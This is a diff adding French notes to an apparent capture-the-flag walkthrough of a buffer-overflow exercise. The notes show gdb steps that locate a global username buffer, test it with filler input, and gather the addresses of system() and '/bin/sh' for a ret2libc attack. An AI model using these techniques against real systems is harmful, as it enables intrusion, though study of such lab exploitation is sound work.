@@ -40,3 +40,27 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 
 Faire des tests avec des suites de caracteres (pour username, commencer par "dat_wil")  
+
+On repere l''adresse de la globale user_name : 
+- Dans le code ASM pour le premier fgets:
+  0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
+  0x08048528 <+88>:	call   0x8048370 <fgets@plt>
+- Ou grace a info variables:
+  (gdb) info variable a_user_name
+  All variables matching regular expression "a_user_name":
+  Non-debugging symbols:
+  0x0804a040  a_user_name
+On checke avec AAAA dans le user_name:
+  (gdb) x/4s 0x0804a040
+  0x804a040 <a_user_name>:	 "AAAAAAAA\n"
+
+ret2libc
+// On repere l'adresse de system()
+(gdb) p system
+$17 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+// On repere la chaine /bin/sh
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec          <--------------------------
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
